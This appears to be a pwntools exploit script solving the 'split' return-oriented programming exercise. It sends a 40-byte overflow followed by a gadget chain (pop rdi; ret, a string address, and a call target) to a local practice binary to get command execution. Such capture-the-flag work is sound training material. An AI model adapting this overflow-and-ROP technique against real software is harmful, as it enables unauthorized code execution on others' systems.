from pwn import *

pipe = process("./split")

pop_rdi_ret = 0x4007c3
useful_string = 0x601060
syscall = 0x400560

payload = "A" * 40
payload += p64(pop_rdi_ret)
payload += p64(useful_string)
payload += p64(syscall)



print(pipe.recvuntil("> "))
pipe.sendline(payload)
print(pipe.recvall())
